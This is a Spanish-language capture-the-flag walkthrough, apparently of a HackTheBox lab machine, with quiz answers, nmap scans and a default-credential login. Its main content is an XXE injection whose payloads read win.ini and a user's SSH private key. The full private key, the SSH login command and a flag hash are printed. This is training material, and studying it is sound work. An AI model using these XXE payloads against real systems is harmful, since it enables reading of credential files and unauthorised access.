1)¿Qué versión de Apache se está ejecutando en el puerto 80 del objetivo?
	2.4.41
	
2)¿Qué combinación de nombre de usuario y contraseña funciona correctamente?
	Admin:password

3)¿Cuál es la palabra en la parte superior de la página que acepta la entrada del usuario?
	order

4)¿Qué versión de XML se utiliza en el objetivo?
	1.0
	![[Markup8.png]]
	Esto lo saque del codigo fuente

5)¿Qué significa el acrónimo de ataque XXE / XEE?
	xml external entity
	Una **vulnerabilidad XXE** ocurre cuando una aplicación lee archivos XML y permite que se carguen datos externos. Esto puede hacer que un atacante lea archivos del sistema o envíe datos a servidores externos. Es un fallo de seguridad que puede exponer información sensible.

6)¿Qué nombre de usuario podemos encontrar en el código HTML de la página web?
	Daniel
	![[Markup9.png]]
	Tambien estaba la informacion en el codigo fuente
	
7)¿Cuál es el archivo ubicado en la carpeta Log-Management en el objetivo?
	job.bat
	Lo descubrimos listando el contenido del archivo C:\Log-Management/job.bat

8)¿Qué ejecutable se mencion a en el archivo antes citado?
	wevtutil.exe



------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.127.52
nmap -p- --open -vvv --min-rate 5000 -sS -n -Pn 10.129.127.52 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80,443 10.129.127.52 -oN target
```

![[Markup1.png]]

![[Markup2.png]]

![[Markup3.png]]

![[Markup4.png]]
*Ttl:* Maquina windows
*Puertos*
`22`SSH
`80`HTTP
`443`HTTPS

-----------
# [[Enumeracion con pequeño script de NMAP y Whatweb-wappalyzer]]

```shell
whatweb http://10.129.127.52/
```

![[Markup5.png]]
```shell
nmap --script http-enum -p80,443 10.129.127.52 -oN webScan
```

![[Markup6.png]]
No nos da ninguna informacion relevante

-------
# Pagina principal
Necesitamos descubrir el usuario y contraseña
![[Markup7.png]]
Probando las contraseñas mas comunes dan las credenciales
Admin:password
https://cybernews.com/best-password-managers/most-common-passwords/

----------

# [[XXE (XML External Entity)]] y conexion por [[ssh]]

Interceptamos con burpsuite la peticion de la parte de ordenes de la pagina
![[Markup10.png]]

![[Markup12.png]]
Ahora vamos a cambiar la estructura del XML por lo que vimos en el [articulo de xxe payloadallthethings](https://gitlab.com/kalilinux/packages/payloadsallthethings/-/tree/kali/master/XXE%20Injection)
![[Markup14.png]]

Como estamos en una maquina linux, vamos a leer el archivo win.ini de prueba, en la parte que pusimos &test; lo hicimos por que el unico output que se muestra como se ve en la primera foto es el de esa etiqueta
```xml
<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order><quantity>test</quantity><item>&test;</item><address>test2</address></order>
```


![[Markup13.png]]

### Sacamos archivo de id_rsa
Como sabemos que existe el usuario daniel y esta activo el servicio de ssh por el puerto 22 como vimos antes con nmap
Vamos a ver si en su escritorio tiene las claves de ssh
```
<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
<order><quantity>test</quantity><item>&test;</item><address>test2</address></order>
```


```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Crear un archivo que se llame *id_rsa*, poner todo el contenido y darle permiso `chmod 400 id_rsa`

### Conexion por [[ssh]]

```
ssh -i id_rsa daniel@10.129.127.52 -p 22
```
![[Markup15.png]]

---
# Escalada de privilegios a root


![[Markup19.png]]


Ejecutamos una [[powershell]]










Con [[type]] podemos catear la flag de user.txt que esta en el escritorio del user daniel
![[Markup17.png]]
032d2fc8952a8c24e39c8f0ee9918ef7


------
# Notas

#### Si esta activo el servicio ssh, podemos buscar las credenciales en su directorio c:/users/daniel/.ssh/id_rsa
Para las id_rsa dar el permiso 400 `chmod 400 id_rsa`

--------
# Creditos
Writeup oficial HackTheBox